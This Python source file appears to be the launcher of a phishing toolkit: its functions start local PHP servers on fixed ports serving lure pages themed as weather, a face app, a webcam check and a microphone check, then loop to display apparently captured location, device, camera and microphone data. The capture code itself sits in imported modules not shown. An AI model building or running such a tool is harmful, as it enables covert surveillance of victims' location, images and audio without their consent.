from module import banner,localhost,paths,messages

def weather_start():
    banner.banner()
    localhost.run_php_server(port=2897,dir_name="weather")
    while True:
        localhost.After_click(
        after_click_template_name=paths.weather_temp("info"),
        after_click_path_message=messages.show_message("loc"),
        after_click_status='YES_CONTINUE'
        )
        if_exit = localhost.Before_click(
            before_click_template_name=paths.weather_temp("result"),
            before_click_status="DO_NOT_CONTINUE",
            before_click_focus="location"
            )

        
        exit_error = localhost.error_handler(paths.weather_temp("error"))
        
        if if_exit == "YES_EXIT" or exit_error == "YES_EXIT":
            break
        
        elif if_exit == "NO_EXIT" or exit_error == "NO_EXIT":
            pass



def normal_data():
    banner.banner()
    localhost.run_php_server(port=2525,dir_name="normal_data")
    while True:
        if_exit = localhost.After_click(
        after_click_template_name=paths.normal_temp("info"),
        after_click_status="NO_IM_NORMAL"
        )

        if if_exit == "YES_EXIT":
            break
        
        elif if_exit == "NO_EXIT":
            pass



def camera_temp_start():
    banner.banner()
    localhost.run_php_server(port=2627,dir_name="camera_temp")
    while True:

        localhost.After_click(
        after_click_template_name=paths.webcam_temp("face-app-info"),
        after_click_path_message=messages.show_message("webcam"),
        after_click_status='YES_CONTINUE'
        )


        if_exit = localhost.Before_click(
            before_click_template_name=paths.webcam_temp("face-app-result"),
            before_click_status="DO_NOT_CONTINUE",
            before_click_focus="webcam"
            )


        
        
        if if_exit == "YES_EXIT":
            break
        
        elif if_exit == "NO_EXIT":
            pass


def microphone_temp_start():
    banner.banner()
    localhost.run_php_server(port=2564,dir_name="microphone")
    while True:

        localhost.After_click(
        after_click_template_name=paths.microphone_temp("microphone-info"),
        after_click_path_message=messages.show_message("mic"),
        after_click_status='YES_CONTINUE'
        )


        if_exit = localhost.Before_click(
            before_click_template_name=paths.microphone_temp("microphone-result"),
            before_click_status="DO_NOT_CONTINUE",
            before_click_focus="microphone"
            )


        
        
        if if_exit == "YES_EXIT":
            break
        
        elif if_exit == "NO_EXIT":
            pass

